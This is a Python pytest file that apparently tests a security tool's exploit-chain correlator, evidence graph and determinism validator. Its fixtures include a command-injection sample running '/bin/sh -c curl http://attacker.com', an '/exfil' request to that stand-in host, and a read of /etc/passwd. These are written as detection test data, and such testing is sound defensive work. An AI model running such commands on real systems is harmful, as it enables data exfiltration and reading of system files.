"""
Phase 2.2 Integration Tests
Tests SSRF, command injection, and data exfiltration chains.
Validates determinism, evidence graph, and exploit chain detection.
"""

import pytest
import uuid
import time
import json
from typing import List, Dict


class TestSSRFChain:
    """Test SSRF vulnerability chain detection"""
    
    def test_ssrf_complete_chain(self):
        """SSRF: Static finding + internal IP connect + HTTP request"""
        # Setup
        findings = [
            {
                "id": "vuln_ssrf_001",
                "type": "ssrf",
                "severity": "high"
            }
        ]
        
        syscall_events = [
            {
                "event_id": str(uuid.uuid4()),
                "timestamp": int(time.time_ns()),
                "source": "ebpf",
                "event_type": "syscall",
                "details": {
                    "syscall_name": "connect",
                    "destination_ip": "127.0.0.1",
                    "destination_port": 8080
                }
            }
        ]
        
        network_events = [
            {
                "event_id": str(uuid.uuid4()),
                "timestamp": int(time.time_ns()) + 100_000_000,  # 100ms later
                "source": "mitmproxy",
                "event_type": "network",
                "details": {
                    "method": "GET",
                    "url": "http://127.0.0.1:8080/admin",
                    "status_code": 200,
                    "destination_ip": "127.0.0.1"
                }
            }
        ]
        
        # Test: Build evidence chain
        from ai_service.src.runtime.correlator_evidence_chains import EvidenceChainCorrelator
        correlator = EvidenceChainCorrelator()
        chains = correlator.correlate_exploit_chains(
            findings, syscall_events, network_events, []
        )
        
        # Verify
        assert len(chains) >= 1
        chain = chains[0]
        assert chain.chain_type.value == "ssrf"
        assert chain.exploitability_score > 70
        assert len(chain.evidence_links) >= 2
    
    def test_ssrf_missing_network_event(self):
        """SSRF: Partial chain (no HTTP request) should not score high"""
        findings = [{"id": "vuln_ssrf_001", "type": "ssrf"}]
        
        syscall_events = [
            {
                "event_id": str(uuid.uuid4()),
                "timestamp": int(time.time_ns()),
                "source": "ebpf",
                "event_type": "syscall",
                "details": {
                    "syscall_name": "connect",
                    "destination_ip": "127.0.0.1"
                }
            }
        ]
        
        from ai_service.src.runtime.correlator_evidence_chains import EvidenceChainCorrelator
        correlator = EvidenceChainCorrelator()
        chains = correlator.correlate_exploit_chains(
            findings, syscall_events, [], []
        )
        
        # Incomplete chains should not be returned
        assert len(chains) == 0


class TestCommandInjectionChain:
    """Test command injection vulnerability chain detection"""
    
    def test_command_injection_complete_chain(self):
        """Command injection: Finding + execve(/bin/sh) + outbound connection"""
        findings = [
            {
                "id": "vuln_cmd_001",
                "type": "command_injection",
                "severity": "critical"
            }
        ]
        
        syscall_events = [
            {
                "event_id": str(uuid.uuid4()),
                "timestamp": int(time.time_ns()),
                "source": "ebpf",
                "event_type": "syscall",
                "details": {
                    "syscall_name": "execve",
                    "args": ["/bin/sh", "-c", "curl http://attacker.com"]
                }
            }
        ]
        
        network_events = [
            {
                "event_id": str(uuid.uuid4()),
                "timestamp": int(time.time_ns()) + 50_000_000,
                "source": "mitmproxy",
                "event_type": "network",
                "details": {
                    "method": "GET",
                    "url": "http://attacker.com/exfil",
                    "destination_ip": "192.0.2.1"
                }
            }
        ]
        
        from ai_service.src.runtime.correlator_evidence_chains import EvidenceChainCorrelator
        correlator = EvidenceChainCorrelator()
        chains = correlator.correlate_exploit_chains(
            findings, syscall_events, network_events, []
        )
        
        assert len(chains) >= 1
        chain = chains[0]
        assert chain.exploitability_score > 75


class TestPathTraversalChain:
    """Test path traversal vulnerability chain detection"""
    
    def test_path_traversal_complete_chain(self):
        """Path traversal: Finding + open(/etc/passwd)"""
        findings = [
            {
                "id": "vuln_path_001",
                "type": "path_traversal",
                "severity": "high"
            }
        ]
        
        syscall_events = [
            {
                "event_id": str(uuid.uuid4()),
                "timestamp": int(time.time_ns()),
                "source": "ebpf",
                "event_type": "syscall",
                "details": {
                    "syscall_name": "openat",
                    "pathname": "/etc/passwd",
                    "flags": "O_RDONLY"
                }
            }
        ]
        
        from ai_service.src.runtime.correlator_evidence_chains import EvidenceChainCorrelator
        correlator = EvidenceChainCorrelator()
        chains = correlator.correlate_exploit_chains(
            findings, syscall_events, [], []
        )
        
        assert len(chains) >= 1
        chain = chains[0]
        assert chain.chain_type.value == "path_traversal"
        assert chain.exploitability_score > 50


class TestEvidenceGraph:
    """Test evidence graph construction and querying"""
    
    def test_graph_creation(self):
        """Create evidence graph with nodes and edges"""
        from ai_service.src.runtime.evidence_graph import (
            EvidenceGraph, GraphNode, GraphEdge, NodeType, EdgeType
        )
        
        graph = EvidenceGraph()
        
        # Add finding node
        finding_node = GraphNode(
            node_id="finding_001",
            node_type=NodeType.STATIC_FINDING,
            label="SSRF Vulnerability",
            confidence=0.95
        )
        graph.add_node(finding_node)
        
        # Add event nodes
        connect_event = GraphNode(
            node_id="event_001",
            node_type=NodeType.SYSCALL_EVENT,
            label="connect(127.0.0.1)",
            confidence=1.0,
            timestamp=int(time.time_ns())
        )
        graph.add_node(connect_event)
        
        # Add edge
        edge = GraphEdge(
            edge_id="edge_001",
            source_id="event_001",
            target_id="finding_001",
            edge_type=EdgeType.SUPPORTS,
            weight=0.9
        )
        graph.add_edge(edge)
        
        # Verify
        assert len(graph.nodes) == 2
        assert len(graph.edges) == 1
        stats = graph.get_statistics()
        assert stats["num_nodes"] == 2
        assert stats["num_edges"] == 1
    
    def test_graph_pathfinding(self):
        """Test pathfinding in evidence graph"""
        from ai_service.src.runtime.evidence_graph import (
            EvidenceGraph, GraphNode, GraphEdge, NodeType, EdgeType
        )
        
        graph = EvidenceGraph()
        
        # Create linear chain: finding -> event1 -> event2
        nodes = [
            GraphNode("n1", NodeType.STATIC_FINDING, "SSRF", 0.9),
            GraphNode("n2", NodeType.SYSCALL_EVENT, "connect", 1.0),
            GraphNode("n3", NodeType.NETWORK_EVENT, "HTTP request", 1.0)
        ]
        for node in nodes:
            graph.add_node(node)
        
        edges = [
            GraphEdge("e1", "n2", "n1", EdgeType.SUPPORTS, 0.9),
            GraphEdge("e2", "n3", "n2", EdgeType.TEMPORAL, 0.8)
        ]
        for edge in edges:
            graph.add_edge(edge)
        
        # Find paths
        paths = graph.find_paths("n3", "n1")
        
        assert len(paths) > 0
        assert "n1" in paths[0]
        assert "n3" in paths[0]


class TestDeterminism:
    """Test Phase 2.2 determinism validation"""
    
    def test_determinism_pass(self):
        """Three identical runs should achieve >95% determinism"""
        from ai_service.src.runtime.phase2_2_determinism import Phase22DeterminismValidator
        
        validator = Phase22DeterminismValidator()
        
        # Create identical events across 3 runs
        base_events = [
            {
                "event_id": str(uuid.uuid4()),
                "timestamp": 1000000000000,
                "source": "ebpf",
                "event_type": "syscall",
                "details": {"syscall_name": "connect", "destination_ip": "127.0.0.1"}
            }
        ]
        
        runs = [base_events, base_events, base_events]
        chains = [[], [], []]
        
        metrics = validator.validate_determinism(
            runs[0], runs[1], runs[2],
            chains[0], chains[1], chains[2]
        )
        
        assert metrics.overall_score > 95
        assert str(metrics.status.value) == "pass"
    
    def test_determinism_ordering_tolerance(self):
        """Events within 50ms should maintain ordering consistency"""
        from ai_service.src.runtime.phase2_2_determinism import Phase22DeterminismValidator
        
        validator = Phase22DeterminismValidator()
        
        # Create events with slight timing variations (±50ms)
        base_time = 1000000000000
        events_run1 = [
            {"timestamp": base_time, "event_type": "syscall", "details": {}},
            {"timestamp": base_time + 100_000_000, "event_type": "network", "details": {}}
        ]
        
        events_run2 = [
            {"timestamp": base_time + 10_000_000, "event_type": "syscall", "details": {}},  # ±10ms
            {"timestamp": base_time + 110_000_000, "event_type": "network", "details": {}}  # ±10ms
        ]
        
        events_run3 = [
            {"timestamp": base_time - 20_000_000, "event_type": "syscall", "details": {}},  # -20ms
            {"timestamp": base_time + 80_000_000, "event_type": "network", "details": {}}  # -20ms
        ]
        
        metrics = validator.validate_determinism(
            events_run1, events_run2, events_run3,
            [], [], []
        )
        
        # Should still maintain good ordering consistency with small variations
        assert metrics.ordering_consistency >= 0.80


class TestNetworkNoise:
    """Test network noise handling"""
    
    def test_network_noise_filtering(self):
        """Spurious network events should be filtered as noise"""
        from ai_service.src.runtime.phase2_2_determinism import Phase22DeterminismValidator
        
        validator = Phase22DeterminismValidator()
        
        base_events = [
            {"event_type": "network", "details": {}}
        ]
        
        # Run 1: 1 event
        events_run1 = base_events
        
        # Run 2: 1 event (same)
        events_run2 = base_events
        
        # Run 3: 5 events (spurious ones)
        events_run3 = base_events + [
            {"event_type": "network", "details": {"spurious": True}},
            {"event_type": "network", "details": {"spurious": True}},
            {"event_type": "network", "details": {"spurious": True}},
            {"event_type": "network", "details": {"spurious": True}}
        ]
        
        metrics = validator.validate_determinism(
            events_run1, events_run2, events_run3,
            [], [], []
        )
        
        # Network noise ratio should be detected
        assert metrics.network_noise_ratio > 0
